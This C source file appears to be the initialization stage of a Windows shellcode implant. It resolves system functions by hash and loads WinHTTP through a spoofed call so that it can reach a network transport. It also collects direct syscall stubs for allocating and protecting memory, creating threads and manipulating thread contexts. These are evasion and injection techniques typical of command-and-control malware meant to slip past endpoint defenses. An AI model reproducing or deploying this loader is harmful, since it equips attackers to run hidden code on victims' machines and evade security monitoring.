#include <windows.h>

#include "ntdll.h"
#include "Instance.h"
#include "Prototypes.h"
#include "PreHash.h"

D_SEC(C) BYTE winHttpModName[] = "Winhttp.dll";

D_SEC(B)
VOID PreMain(
    _In_ PVOID Param)
{



    INSTANCE Inst;

    Inst.Info.pStartAddr    = GetShellcodeStart();
    Inst.Info.pEnd          = GetShellcodeEnd();
    Inst.Info.dwSize        = U_PTR(Inst.Info.pEnd) - U_PTR(Inst.Info.pStartAddr);

    Inst.Module.Kernel32    = xGetModuleHandle(HASH_Kernel32);
    Inst.Module.Ntdll       = xGetModuleHandle(HASH_Ntdll);
    Inst.Module.Kernelbase  = xGetModuleHandle(HASH_Kernelbase);

    if (!Inst.Module.Kernel32 || !Inst.Module.Ntdll)
    {
        return;
    }

    Inst.Win32.LocalAlloc           = xGetProcAddress(Inst.Module.Kernel32, HASH_LocalAlloc);
    Inst.Win32.LocalReAlloc         = xGetProcAddress(Inst.Module.Kernel32, HASH_LocalReAlloc);
    Inst.Win32.LocalFree            = xGetProcAddress(Inst.Module.Kernel32, HASH_LocalFree);
    Inst.Win32.LoadLibraryA         = xGetProcAddress(Inst.Module.Kernel32, HASH_LoadLibraryA);
    Inst.Win32.VirtualFree          = xGetProcAddress(Inst.Module.Kernel32, HASH_VirtualFree);
    Inst.Win32.RtlCaptureContext    = xGetProcAddress(Inst.Module.Ntdll, HASH_RtlCaptureContext);
    Inst.Win32.RtlExitUserThread    = xGetProcAddress(Inst.Module.Ntdll, HASH_RtlExitUserThread);
    Inst.Win32.RtlUserThreadStart   = xGetProcAddress(Inst.Module.Ntdll, HASH_RtlUserThreadStart);

    if (
        !Inst.Win32.LoadLibraryA        ||
        !Inst.Win32.LocalAlloc          ||
        !Inst.Win32.LocalReAlloc        ||
        !Inst.Win32.LocalFree           ||
        !Inst.Win32.VirtualFree         ||
        !Inst.Win32.RtlCaptureContext   ||
        !Inst.Win32.RtlExitUserThread   ||
        !Inst.Win32.RtlUserThreadStart
        )
    {
        return;
    }

    Inst.Module.Winhttp = SPOOF(Inst.Win32.LoadLibraryA, Inst.Module.Kernelbase, &winHttpModName);
    if (!Inst.Module.Winhttp)
    {
        return;
    }
    Inst.Transport.WinHttpOpen              = xGetProcAddress(Inst.Module.Winhttp, HASH_WinHttpOpen);
    Inst.Transport.WinHttpConnect           = xGetProcAddress(Inst.Module.Winhttp, HASH_WinHttpConnect);
    Inst.Transport.WinHttpOpenRequest       = xGetProcAddress(Inst.Module.Winhttp, HASH_WinHttpOpenRequest);
    Inst.Transport.WinHttpSendRequest       = xGetProcAddress(Inst.Module.Winhttp, HASH_WinHttpSendRequest);
    Inst.Transport.WinHttpReceiveResponse   = xGetProcAddress(Inst.Module.Winhttp, HASH_WinHttpReceiveResponse);
    Inst.Transport.WinHttpReadData          = xGetProcAddress(Inst.Module.Winhttp, HASH_WinHttpReadData);
    Inst.Transport.WinHttpCloseHandle       = xGetProcAddress(Inst.Module.Winhttp, HASH_WinHttpCloseHandle);

    if (
        !Inst.Transport.WinHttpOpen             ||
        !Inst.Transport.WinHttpConnect          ||
        !Inst.Transport.WinHttpOpenRequest      ||
        !Inst.Transport.WinHttpSendRequest      ||
        !Inst.Transport.WinHttpReceiveResponse  ||
        !Inst.Transport.WinHttpReadData         ||
        !Inst.Transport.WinHttpCloseHandle
        )
    {
        return;
    }

    if (!GetSyscall(xGetProcAddress(Inst.Module.Ntdll, HASH_NtAllocateVirtualMemory), &Inst.Sys.NtAllocateVirtualMemory))
    {
        return;
    }

    if (!GetSyscall(xGetProcAddress(Inst.Module.Ntdll, HASH_NtProtectVirtualMemory), &Inst.Sys.NtProtectVirtualMemory))
    {
        return;
    }

    if (!GetSyscall(xGetProcAddress(Inst.Module.Ntdll, HASH_NtCreateThreadEx), &Inst.Sys.NtCreateThreadEx))
    {
        return;
    }

    if (!GetSyscall(xGetProcAddress(Inst.Module.Ntdll, HASH_NtGetContextThread), &Inst.Sys.NtGetContextThread))
    {
        return;
    }

    if (!GetSyscall(xGetProcAddress(Inst.Module.Ntdll, HASH_NtSetContextThread), &Inst.Sys.NtSetContextThread))
    {
        return;
    }

    if (!GetSyscall(xGetProcAddress(Inst.Module.Ntdll, HASH_NtResumeThread), &Inst.Sys.NtResumeThread))
    {
        return;
    }

    if (!GetSyscall(xGetProcAddress(Inst.Module.Ntdll, HASH_NtContinue), &Inst.Sys.NtContinue))
    {
        return;
    }

    Main(Param, &Inst);
}